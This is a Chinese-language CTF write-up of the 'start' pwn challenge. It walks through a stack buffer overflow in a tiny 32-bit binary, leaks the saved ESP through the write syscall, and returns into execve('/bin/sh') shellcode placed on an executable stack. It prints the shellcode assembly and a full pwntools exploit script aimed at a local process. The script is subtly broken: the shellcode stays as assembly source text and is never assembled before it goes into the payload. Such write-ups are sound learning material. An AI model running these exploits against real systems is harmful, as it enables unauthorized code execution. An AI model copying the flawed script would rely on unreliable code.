**第一次做国外的题，直接被第一题难住了。和国内的题感觉是两种思路，这才叫真正的二进制**

# 代码分析

我们先来看一下代码，代码非常简单  
![image.png](https://image.3001.net/images/20211111/1636614901_618cc2f54d9f6a80101c3.png!small)  
![image.png](https://image.3001.net/images/20211111/1636614913_618cc301be4b8e39d985c.png!small)  
这个题大家也看到了，只有两个函数，而且都使用了系统调用，然后我们来看一下具体的代码执行流程。

这个代码只有esp，先push了ESP，然后push了exit函数的地址  
![image.png](https://image.3001.net/images/20211111/1636615061_618cc395603aa92990d52.png!small)  
再插入一些字符串，然后使用系统调用，我们来看一下栈空间  
![image.png](https://image.3001.net/images/20211111/1636615133_618cc3dddd16bc9d3a0e9.png!small)  
输出一段字符，然后再次进行一个系统调用  
![image.png](https://image.3001.net/images/20211111/1636615183_618cc40f30734d0278f8e.png!small)  
这次是让输入一串字符，输入字符的个数为0x3C，但是大家可以发现使用的是之前输出字符的地址，之前输出的时候一共输出了0x14个字符，然后接着往下看  
![image.png](https://image.3001.net/images/20211111/1636615321_618cc49984d961560a4e0.png!small)  
恢复栈顶以后ret，返回到exit函数中。

由此我们可以判断存在栈溢出漏洞

# 栈模型

我们来看一下栈此时的布局  
![image.png](https://image.3001.net/images/20211111/1636615619_618cc5c34110998d72968.png!small)  
此时esp寄存器指向顶部，输出字符串的空间一共只有0x14个字节。但是输入的字符有0x3C个字节。最后ret会将exit函数的地址pop到EIP中。

# 漏洞利用思路

首先我们需要填满输出的字符串的空间，然后我们就可以随意修改ret地址。我们的shellcode应该写到栈中，所以我们还需要泄露一波保存的esp的地址，通过这个地址来计算出我们shellcode的偏移，然后拿到shell。

我们首先注意一个细节  
![image.png](https://image.3001.net/images/20211111/1636616265_618cc849add2cd38306ea.png!small)  
这里是通过esp将字符传入ecx寄存器中，然后进行系统调用的。那么当我们运行到ret指令的时候![image.png](https://image.3001.net/images/20211111/1636616351_618cc89f652d5cd44fcae.png!small)  
注意此时的栈空间，ret指令结束以后esp指针就会指向0xffffd14c地址，这就是保存的最开始的ESP的值。这也是为什么我们可以以这种思路进行漏洞利用。

泄露出ESP地址以后我们就可以覆盖ret指令。ret就是指向我们的shellcode，由于没有NX保护，因此栈空间有可执行权限。我们的shellcode只不过就是一个汇编以后的系统调用而已

# 实操

我先尝试打的本地，首先看一下泄露初始ESP的代码

    
    
    p.recvuntil(":")
    payload1 = "A"*0x14 + p32(0x8048087)
    p.sendline(payload1)
    p.recv()
    

然后我们看一下效果  
![image.png](https://image.3001.net/images/20211111/1636617698_618ccde20f7aac12b0d8b.png!small)  
pwntools加gdb联合调试会发现前四个字节输出的前四个字节就是地址(一定要记住，小端序！小端序！)

此时栈的情况已经了解差不多了，然后我们来写一下shellcode。  
shellcode其实在调试的过程中已经有示例了  
![image.png](https://image.3001.net/images/20211111/1636622694_618ce166282cd47a41a7a.png!small)  
我们也是类似这样

    
    
    xor eax,eax
    xor ebx,ebx
    xor ecx,ecx
    xor edx,edx 
    push eax
    push 0x68732f 
    push 0x6e69622f
    mov ebx,esp
    mov al,0xb
    int 0x80
    

好了，这就是我们的shellcode，其实就是一个系统调用，系统调用号为0xb，后面的寄存器都是参数。

接下来就是返回到shellcode上面。然后直接附上exp

    
    
    from pwn import *
    context.log_level = "debug"
    p = process('/home/wjl/Desktop/start' )
    
    shellcode='''
    xor eax,eax
    xor ebx,ebx
    xor ecx,ecx
    xor edx,edx 
    push eax
    push 0x68732f 
    push 0x6e69622f
    mov ebx,esp
    mov al,0xb
    int 0x80
    '''
    
    payload1 = 'A'*0x14 + p32(0x8048087)
    p.sendafter("Let's start the CTF:",payload1)
    esp = u32(p.recv(4))
    print esp
    payload2 = 'A'*0x14 + p32(esp+0x14)+shellcode
    p.send(payload2)
    p.interactive()
    

最开始的时候就是对于shellcode没有思路，现在我们稍微将代码改动一下，然后用gdb进行调试。  
![image.png](https://image.3001.net/images/20211111/1636633291_618d0acb3ac05c921d0f9.png!small)  
第一次返回到write的系统调用  
![image.png](https://image.3001.net/images/20211111/1636633340_618d0afccdcf3fc6d293a.png!small)  
然后通过系统调用泄露出esp地址  
![image.png](https://image.3001.net/images/20211111/1636633398_618d0b36e5e839d5330b9.png!small)  
然后通过read系统调用将shellcode写到栈中  
![image.png](https://image.3001.net/images/20211111/1636633448_618d0b68a314e58110a06.png!small)  
然后返回到我们的shellcode处并且执行

 **一天一道pwn，一道pwn做一天，最开始确实不适应，只能慢慢来了**

